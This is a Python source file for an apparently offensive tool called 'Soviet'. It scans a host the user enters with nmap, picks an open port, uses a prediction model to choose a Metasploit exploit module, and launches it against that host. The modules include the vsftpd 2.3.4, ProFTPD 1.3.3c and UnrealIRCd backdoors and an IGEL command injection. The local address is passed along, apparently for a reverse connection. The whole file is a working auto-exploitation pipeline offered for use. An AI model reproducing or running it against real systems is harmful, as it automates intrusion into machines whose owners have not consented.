import os
import sys
import time
import nmap as nm
import pyfiglet
import extra.predict as predict
import extra.command as command
import json
import platform
import numpy as np
from extra.color import Color
import socket
import warnings

class Soviet():
    def __init__(self) -> None:
        warnings.filterwarnings('ignore')
        with open(os.path.join("config/config.json"), "r") as f:
            data = json.load(f)
        self.name = data['Name']
        self.Version = data['Version']
        self.font = data['font']
        self.port = data['port']
        self.arg = data['arguments']
        self.user_port = data['user-port']['selected']
        self.predict = predict.Predict()

    def logo(self):
        return str(pyfiglet.figlet_format(
            str(self.name),
            str(self.font)
        ))

    def lhost(self):
        ip = []
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip.append(s.getsockname()[0])
        s.close()
        return ip

    def nmap(self):
        try:
            try:
                self.user = str(input("\033[0;36m-->\033[1;37m "))
            except KeyboardInterrupt:
                print("\033[1;31mExit....")
                sys.exit(0)
        except Exception:
            self.USER()

        nmap = nm.PortScanner()
        scan = nmap.scan(self.user, self.port, self.arg)
        main = scan['scan'][str(self.user)]['tcp']
        self.ip = scan['scan'][str(self.user)]['tcp'].keys()
        if self.user_port == "random":
            self.PORT = np.random.choice(np.array(list(self.ip)))
        else:
            print(f"\033[1;34m[+]\033[1;37m Ported Found => \033[1;36m{list(self.ip)}\033[0m")
            self.PORT = int(input("\033[1;32m[*]\033[1;37m Select the Port => "))
        self.STATE = main[self.PORT]['state']
        self.SERVICE = main[self.PORT]['name']
        self.VERSION = main[self.PORT]['product']
        try:
            self.mac = scan['scan'][self.user]['addresses']['mac']
        except Exception:
            self.mac = ""

        try:
            self.ipv4 = scan['scan'][self.user]['addresses']['ipv4']
        except Exception:
            self.ipv4 = ""

        try:
            self.vendor = scan['scan'][self.user]["vendor"][str(self.mac)]
        except Exception:
            self.vendor = ""

        try:
            self.status = scan['scan'][self.user]['status']['state']
        except Exception:
            self.status = ""

        try:
            self.last_boot = scan['scan'][self.user]['uptime']['lastboot']
        except Exception:
            self.last_boot = ""

        try:
            self.method = scan['nmap']['scaninfo']['tcp']['method']
        except Exception:
            self.method = ""


    def USER(self):
        warnings.filterwarnings('ignore')
        command.sprint(f"{self.name} is Starting....")
        print("\033[0m", end="")
        os.system("clear")
        print(self.logo())
        print(f"\033[1;37m\n[ Author : Aman Raj ]\n[ Version : {self.Version} ]\n[ Starting Time : {time.strftime('%H:%M')} ]\n[ System Found : {str(platform.system()).capitalize()} ]\033[0m\n\n")
        self.nmap()
        print(f"{Color.BLUE}[+] {Color.WHITE}Port for Scanning => {self.PORT}")
        print(f"{Color.BLUE}[+] {Color.WHITE}State for Detected => {self.STATE}")
        print(f"{Color.BLUE}[+] {Color.WHITE}Service for Detected => {self.SERVICE}")
        print(f"{Color.BLUE}[+] {Color.WHITE}Version for Detected => {self.VERSION}")
        print(f"{Color.BLUE}[+] {Color.WHITE}MAC for Detected => \033[1;32m{self.mac}")
        print(f"{Color.BLUE}[+] {Color.WHITE}IPV4 for Detected => \033[1;32m{self.ipv4}")
        print(f"{Color.BLUE}[+] {Color.WHITE}MAC Vendor for Detected => \033[1;33m{self.vendor}")
        print(f"{Color.BLUE}[+] {Color.WHITE}Machine Status => {self.status}")
        print(f"{Color.BLUE}[+] {Color.WHITE}Machine Last Time Boot at => {self.last_boot}")
        print(f"{Color.BLUE}[+] {Color.WHITE}Method Used => \033[1;31m{self.method}\033[0m")
        predicted = self.predict.predict(self.PORT, self.STATE, self.SERVICE, self.VERSION)
        if predicted == 'None' or predicted == None:
            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {predicted}")
            sys.exit(23)
        elif predicted == 'exploit/unix/ftp/vsftpd_234_backdoor':
            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {predicted}")
            command.ftp(predicted, self.user)
        elif predicted == "exploit/unix/ftp/proftpd_133c_backdoor" or predicted == "exploit/unix/irc/unreal_ircd_3281_backdoor":
            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {predicted}")
            command.other(predicted, self.user, self.lhost()[0])
        elif predicted == "exploit/linux/misc/igel_command_injection":
            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {predicted}")
            command.igel(predicted, self.user, self.lhost()[0], self.lhost()[0])
        else:
            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {predicted}")
            command.metasploit(predicted, self.user, self.lhost()[0])


if __name__ == '__main__':
    run = Soviet()
    run.USER()
